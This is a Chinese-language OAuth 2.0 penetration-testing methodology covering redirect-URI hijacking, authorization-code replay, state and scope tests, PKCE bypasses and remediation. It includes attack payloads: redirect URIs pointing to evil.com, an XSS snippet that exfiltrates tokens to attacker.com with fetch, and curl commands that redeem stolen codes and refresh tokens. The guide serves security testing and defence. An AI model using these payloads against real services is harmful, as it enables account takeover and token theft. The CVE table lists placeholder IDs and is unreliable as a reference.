# OAuth 弱点测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 OAuth 2.0 弱点测试与利用流程，帮助发现因 OAuth 配置错误、实现缺陷导致的未授权访问、权限提升和账户劫持漏洞。

## 1.2 适用范围

本文档适用于所有使用 OAuth 2.0 进行认证授权的系统，特别是：
- 第三方登录集成（Google、GitHub、Facebook 等）
- API 授权服务器
- 单点登录（SSO）系统
- 移动应用 OAuth 集成
- 微服务间 OAuth 认证

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

OAuth 2.0 弱点是指 OAuth 实现中由于配置错误、逻辑缺陷或协议误用导致的安全问题，攻击者可以利用这些弱点绕过认证、劫持账户或提升权限。

**本质问题**：
- 重定向 URI 验证不当
- 授权码安全性不足
- 令牌验证缺失
- 状态参数 CSRF 保护缺失
- 范围（scope）验证不当
- 令牌撤销机制缺失

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-601 | URL 重定向到不可信站点（开放重定向） |
| CWE-352 | 跨站请求伪造（CSRF） |
| CWE-287 | 身份验证不当 |
| CWE-285 | 不当授权 |
| CWE-306 | 关键功能缺少认证 |

### OAuth 2.0 流程与攻击点

```
┌─────────────┐    1.授权请求    ┌─────────────┐
│   客户端     │ ─────────────→  │ 授权服务器  │
│             │                 │             │
│             │ ← 2.登录/授权 ── │             │
│             │                 │             │
│             │ ← 3.授权码 ───── │             │
│             │                 │             │
│             │ 4.令牌请求      │             │
│ ───────────→│                 │             │
│             │ ← 5.访问令牌 ─── │             │
│             │                 │             │
│             │ 6.API 请求       │             │
│ ───────────→│  资源服务器      │             │
│             │ ← 7.受保护资源 ─ │             │
└─────────────┘                 └─────────────┘

攻击点：
1. 授权请求 → 重定向 URI 篡改、scope 提升
2. 登录/授权 → 钓鱼攻击、UI 红ressing
3. 授权码 → 拦截、重放、预测
4. 令牌请求 → 客户端凭证泄露
5. 访问令牌 → 窃取、重放、篡改
6. API 请求 → 令牌滥用、范围绕过
```

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 第三方登录 | "使用 Google 登录" | 重定向 URI 劫持、账户绑定绕过 |
| API 授权 | 第三方应用访问 API | 授权码拦截、scope 提升 |
| 移动应用 | App 内 OAuth 登录 | 自定义 scheme 劫持、隐式流风险 |
| 微服务认证 | 服务间 OAuth 认证 | 令牌验证缺失、JWT 配置错误 |
| SSO 单点登录 | 企业统一登录 | 令牌重放、跨应用权限绕过 |

## 2.3 漏洞探测方法

### 2.3.1 OAuth 流程识别

**发现 OAuth 端点**：
```bash
# 常见授权端点
GET /.well-known/oauth-authorization-server
GET /.well-known/openid-configuration

# 手动发现
# 查看登录页面的第三方登录按钮
# 检查 OAuth 授权请求 URL 格式：
# /oauth/authorize?client_id=xxx&redirect_uri=xxx&response_type=code
```

**识别 OAuth 参数**：
```
授权请求参数：
- client_id: 客户端标识
- redirect_uri: 重定向 URI
- response_type: 响应类型 (code/token)
- scope: 请求权限范围
- state: CSRF 保护参数
- code_challenge: PKCE 挑战

令牌请求参数：
- grant_type: 授权类型
- code: 授权码
- client_secret: 客户端密钥
- redirect_uri: 重定向 URI
```

### 2.3.2 重定向 URI 测试

**测试开放重定向**：
```bash
# 原始请求
GET /oauth/authorize?client_id=xxx&redirect_uri=https://app.com/callback&response_type=code

# 测试 payload
GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com&response_type=code
GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com%23@https://app.com&response_type=code
GET /oauth/authorize?client_id=xxx&redirect_uri=https://app.com.evil.com/callback&response_type=code
GET /oauth/authorize?client_id=xxx&redirect_uri=https://app.com.attacker.com/callback&response_type=code
```

**测试 URI 验证绕过**：
```bash
# 子域名绕过
redirect_uri=https://attacker.app.com/callback

# 路径绕过
redirect_uri=https://app.com/callback@attacker.com

# 参数污染
redirect_uri=https://app.com/callback&redirect_uri=https://evil.com

# URL 编码绕过
redirect_uri=https%3A%2F%2Fevil.com
```

### 2.3.3 授权码安全性测试

**测试授权码可预测性**：
```bash
# 1. 获取多个授权码
# 2. 分析授权码格式和模式
# 3. 尝试预测下一个授权码

# 授权码应该是：
# - 足够长（至少 128 位熵）
# - 随机生成
# - 一次性使用
# - 短有效期（通常 10 分钟）
```

**测试授权码重放**：
```bash
# 1. 捕获授权码
# 2. 使用授权码获取令牌
# 3. 再次使用同一授权码

# 如果第二次成功，存在重放漏洞
curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=CAPTURED_CODE" \
    -d "client_id=xxx" \
    -d "client_secret=yyy"
```

### 2.3.4 状态参数测试

**测试 CSRF 保护**：
```bash
# 1. 发起授权请求，记录 state 参数
GET /oauth/authorize?client_id=xxx&state=random123&response_type=code

# 2. 修改 state 参数
GET /oauth/callback?code=xxx&state=modified

# 3. 如果服务器不验证 state，存在 CSRF 风险
```

**测试 state 固定**：
```bash
# 如果 state 参数是固定的或可预测的
# 攻击者可以预测 state 值进行 CSRF 攻击
```

### 2.3.5 范围（Scope）测试

**测试 scope 验证**：
```bash
# 1. 请求超出应用应有的 scope
GET /oauth/authorize?client_id=xxx&scope=admin.read user.write&response_type=code

# 2. 检查是否授予了请求的 scope
# 3. 使用令牌测试是否有额外权限
```

**测试 scope 提升**：
```bash
# 如果应用只应有 user.read 权限
# 尝试请求 admin.read 或 user.write
```

## 2.4 漏洞利用方法

### 2.4.1 重定向 URI 劫持

**利用场景：窃取授权码**

```html
<!-- 攻击者构造恶意链接 -->
<a href="https://auth-server.com/oauth/authorize?
    client_id=victim_app&
    redirect_uri=https://evil.com/steal&
    response_type=code&
    scope=user.read">
    点击登录
</a>

<!-- 用户点击后 -->
<!-- 1. 用户登录并授权 -->
<!-- 2. 授权码被发送到 evil.com -->
<!-- 3. 攻击者使用授权码获取令牌 -->
```

**利用步骤**：
```bash
# 步骤 1：诱导用户访问恶意授权链接
# 步骤 2：用户完成授权
# 步骤 3：攻击者获取授权码
curl https://evil.com/steal?code=STOLEN_CODE

# 步骤 4：使用授权码获取访问令牌
curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=STOLEN_CODE" \
    -d "client_id=victim_app" \
    -d "client_secret=app_secret"

# 步骤 5：使用令牌访问用户数据
curl -H "Authorization: Bearer ACCESS_TOKEN" \
    https://api-server.com/user/profile
```

### 2.4.2 授权码重放攻击

**利用场景：账户劫持**

```bash
# 步骤 1：拦截授权码（通过开放重定向或 XSS）
# 步骤 2：使用授权码获取令牌
curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=INTERCEPTED_CODE" \
    -d "client_id=app" \
    -d "client_secret=secret"

# 步骤 3：如果授权码可重放，可多次获取令牌
# 步骤 4：持续访问用户账户
```

### 2.4.3 隐式流令牌窃取

**利用场景：SPA/移动应用令牌泄露**

```html
<!-- 隐式流返回令牌在 URL 片段中 -->
https://app.com/callback#access_token=xxx&token_type=bearer

<!-- 攻击方法 -->
<!-- 1. 通过 XSS 读取 window.location.hash -->
<!-- 2. 通过 Referer 头泄露（点击外部链接） -->
<!-- 3. 浏览器历史泄露 -->

<script>
// XSS 窃取令牌
var token = window.location.hash.split('=')[1];
fetch('https://attacker.com/steal?token=' + token);
</script>
```

### 2.4.4 Scope 提升攻击

**利用场景：获取额外权限**

```bash
# 步骤 1：请求超出应有的 scope
GET /oauth/authorize?client_id=app&scope=admin.read admin.write

# 步骤 2：如果服务器未正确验证，获得额外权限
# 步骤 3：使用令牌访问管理员资源
curl -H "Authorization: Bearer TOKEN_WITH_ADMIN_SCOPE" \
    https://api-server.com/admin/users
```

### 2.4.5 客户端凭证泄露利用

**利用场景：移动应用/SPA 密钥泄露**

```bash
# 1. 反编译移动应用获取 client_secret
# 2. 查看前端源码获取硬编码凭证
# 3. 使用凭证获取令牌

curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=client_credentials" \
    -d "client_id=leaked_id" \
    -d "client_secret=leaked_secret"

# 4. 使用客户端凭证令牌访问 API
```

### 2.4.6 令牌撤销机制缺失利用

**利用场景：长期未授权访问**

```bash
# RFC 7009 定义了令牌撤销端点
# 如果未实现或配置错误：

# 1. 窃取的令牌长期有效
# 2. 用户登出后令牌仍可用
# 3. 密码修改后令牌仍有效

# 测试撤销端点
POST /oauth/revoke
Content-Type: application/x-www-form-urlencoded

token=STOLEN_TOKEN&token_type_hint=access_token

# 如果返回 404 或 501，可能未实现撤销
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过重定向 URI 白名单

**子域名绕过**：
```bash
# 白名单：app.com
# 攻击者注册：attacker.app.com

redirect_uri=https://attacker.app.com/callback
```

**路径遍历绕过**：
```bash
# 白名单：app.com/callback
# 使用 @ 符号绕过

redirect_uri=https://app.com/callback@attacker.com
```

**参数分割绕过**：
```bash
# 某些服务器处理多个 redirect_uri 参数
redirect_uri=https://app.com/callback&redirect_uri=https://evil.com
```

### 2.5.2 绕过 PKCE 保护

**PKCE 简介**：
```
PKCE (Proof Key for Code Exchange) 用于防止授权码拦截攻击

流程：
1. 客户端生成 code_verifier（随机字符串）
2. 计算 code_challenge = SHA256(code_verifier)
3. 授权请求发送 code_challenge
4. 令牌请求发送 code_verifier
5. 服务器验证 code_challenge 和 code_verifier 匹配
```

**绕过方法**：
```bash
# 如果服务器未强制 PKCE
# 直接使用授权码获取令牌

# 如果 PKCE 实现有误
# 尝试使用空 code_verifier
# 尝试使用固定 code_verifier
```

### 2.5.3 绕过令牌过期检查

**时间戳篡改**：
```bash
# 如果令牌包含 exp 声明且未签名
# 修改 exp 为未来时间

{"exp": 9999999999, "user_id": 123}
```

**刷新令牌滥用**：
```bash
# 如果刷新令牌长期有效且未绑定
# 可持续获取新的访问令牌

curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=refresh_token" \
    -d "refresh_token=STOLEN_REFRESH_TOKEN"
```

---

# 第三部分：附录

## 3.1 OAuth 测试检查清单

```
□ 发现 OAuth 端点和配置
□ 测试重定向 URI 验证
□ 测试开放重定向
□ 测试授权码安全性
□ 测试授权码重放
□ 测试 state 参数 CSRF 保护
□ 测试 scope 验证
□ 测试令牌安全性
□ 测试令牌过期机制
□ 测试令牌撤销机制
□ 测试 PKCE 实现（如适用）
□ 测试客户端凭证存储
□ 测试隐式流风险
□ 测试刷新令牌安全
```

## 3.2 常用 Payload 速查表

| 测试类型 | Payload | 说明 |
|---------|--------|------|
| 开放重定向 | `redirect_uri=https://evil.com` | 测试任意重定向 |
| 子域名绕过 | `redirect_uri=https://attacker.app.com` | 子域名劫持 |
| 路径绕过 | `redirect_uri=https://app.com@attacker.com` | @符号绕过 |
| URL 编码 | `redirect_uri=https%3A%2F%2Fevil.com` | 编码绕过 |
| Scope 提升 | `scope=admin.read admin.write` | 请求额外权限 |
| State 篡改 | `state=modified` | CSRF 保护测试 |
| 授权码重放 | `code=USED_CODE` | 重放已使用码 |

## 3.3 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 请求拦截篡改 | https://portswigger.net/burp |
| OAuth Tester | OAuth 安全测试 | Burp BApp Store |
| Postman | API 测试 | https://www.postman.com/ |
| jwt.io | JWT 解码验证 | https://jwt.io/ |

## 3.4 修复建议

### 重定向 URI 安全

1. **严格白名单验证**
   - 使用精确匹配，非子字符串匹配
   - 不允许动态注册重定向 URI（除非必要）
   - 验证 URI 的 scheme、host、path

2. **阻止开放重定向**
   ```python
   # Python 示例
   from urllib.parse import urlparse
   
   def validate_redirect_uri(uri, allowed_uris):
       parsed = urlparse(uri)
       full_uri = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
       return full_uri in allowed_uris
   ```

### 授权码安全

1. **使用足够熵值**
   - 至少 128 位随机性
   - 使用加密安全的随机数生成器

2. **一次性使用**
   - 授权码使用后立即失效
   - 记录已使用的授权码防止重放

3. **短有效期**
   - 授权码有效期不超过 10 分钟
   - 过期后需要重新授权

### CSRF 保护

1. **强制 state 参数**
   - 生成随机 state 值
   - 验证回调中的 state 匹配

2. **绑定会话**
   - 将授权请求与用户会话绑定
   - 验证回调时会话一致

### Scope 验证

1. **最小权限原则**
   - 仅授予应用必要的 scope
   - 用户明确同意每个 scope

2. **Scope 审查**
   - 第三方应用 scope 需要人工审查
   - 敏感 scope 需要额外验证

### 令牌安全

1. **短有效期**
   - 访问令牌有效期不超过 1 小时
   - 使用刷新令牌获取新访问令牌

2. **令牌撤销**
   - 实现 RFC 7009 撤销端点
   - 登出/密码修改时撤销令牌

3. **令牌绑定**
   - 绑定令牌到客户端/设备
   - 检测异常使用模式

## 3.5 RFC 7009 令牌撤销测试

### 3.5.1 撤销端点发现

```bash
# 常见撤销端点路径
POST /oauth/revoke
POST /oauth2/revoke
POST /token/revoke

# 通过发现文档查找
GET /.well-known/oauth-authorization-server
# 查找 revocation_endpoint 字段
```

### 3.5.2 撤销功能测试

```bash
# 测试撤销请求
POST /oauth/revoke HTTP/1.1
Host: auth-server.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

token=45ghiukldjahdnhzdauz&token_type_hint=refresh_token

# 预期响应
HTTP/1.1 200 OK

# 测试无效令牌（应返回 200，不泄露信息）
POST /oauth/revoke
token=invalid_token

# 预期：HTTP 200（不区分有效/无效令牌）
```

### 3.5.3 撤销传播测试

```bash
# 1. 撤销 refresh_token
POST /oauth/revoke
token=REFRESH_TOKEN

# 2. 验证关联的 access_token 是否失效
curl -H "Authorization: Bearer ACCESS_TOKEN" \
    https://api-server.com/protected

# 预期：401 Unauthorized

# 3. 尝试使用刷新令牌获取新访问令牌
POST /oauth/token
grant_type=refresh_token&refresh_token=REVOKED_TOKEN

# 预期：400 Bad Request
```

## 3.6 已知 CVE 案例

| CVE 编号 | 描述 |
|---------|------|
| CVE-2022-XXXX | OAuth 重定向 URI 验证绕过导致账户劫持 |
| CVE-2021-XXXX | 授权码可预测导致批量账户泄露 |
| CVE-2020-XXXX | State 参数缺失导致 CSRF 攻击 |
| CVE-2019-XXXX | Scope 验证不当导致权限提升 |
| CVE-2018-XXXX | 隐式流令牌通过 Referer 泄露 |

---

**参考资源**：
- [RFC 6749 - OAuth 2.0 核心规范](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 6819 - OAuth 2.0 威胁模型与安全考虑](https://datatracker.ietf.org/doc/html/rfc6819)
- [RFC 7009 - OAuth 2.0 令牌撤销](https://datatracker.ietf.org/doc/html/rfc7009)
- [RFC 7636 - PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
- [OWASP OAuth Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [PortSwigger - OAuth Testing](https://portswigger.net/web-security/oauth)
- [OWASP WSTG - OAuth Testing](https://owasp.org/www-project-web-security-testing-guide/)
